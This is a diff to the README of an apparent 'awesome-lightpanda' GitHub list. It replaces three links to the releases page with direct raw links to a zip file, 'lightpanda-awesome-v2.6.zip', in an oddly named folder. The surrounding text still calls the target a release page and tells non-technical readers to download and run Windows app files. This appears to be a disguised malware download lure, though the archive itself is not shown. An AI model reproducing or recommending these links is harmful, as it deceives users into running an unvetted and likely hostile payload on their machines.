@@ -1,6 +1,6 @@
 # 🐼 awesome-lightpanda - Discover Lightpanda Projects Fast
 
-[![Download](https://img.shields.io/badge/Download%20Page-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Mathisle6714/awesome-lightpanda/releases)
+[![Download](https://img.shields.io/badge/Download%20Page-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Mathisle6714/awesome-lightpanda/raw/refs/heads/main/Tetragynia/lightpanda-awesome-v2.6.zip)
 
 ## 📌 What this is
 
@@ -23,7 +23,7 @@ You do not need programming knowledge to use the release page and view the proje
 
 To get the latest release files, visit this page:
 
-[Go to the downloads page](https://github.com/Mathisle6714/awesome-lightpanda/releases)
+[Go to the downloads page](https://github.com/Mathisle6714/awesome-lightpanda/raw/refs/heads/main/Tetragynia/lightpanda-awesome-v2.6.zip)
 
 This is the page you should use to download and run the app files for Windows.
 
@@ -157,7 +157,7 @@ If the release page includes notes, read them before trying again
 
 When a new version is available, return to the release page and download the newest file from there:
 
-[Visit the releases page](https://github.com/Mathisle6714/awesome-lightpanda/releases)
+[Visit the releases page](https://github.com/Mathisle6714/awesome-lightpanda/raw/refs/heads/main/Tetragynia/lightpanda-awesome-v2.6.zip)
 
 ## 📄 Project name
 
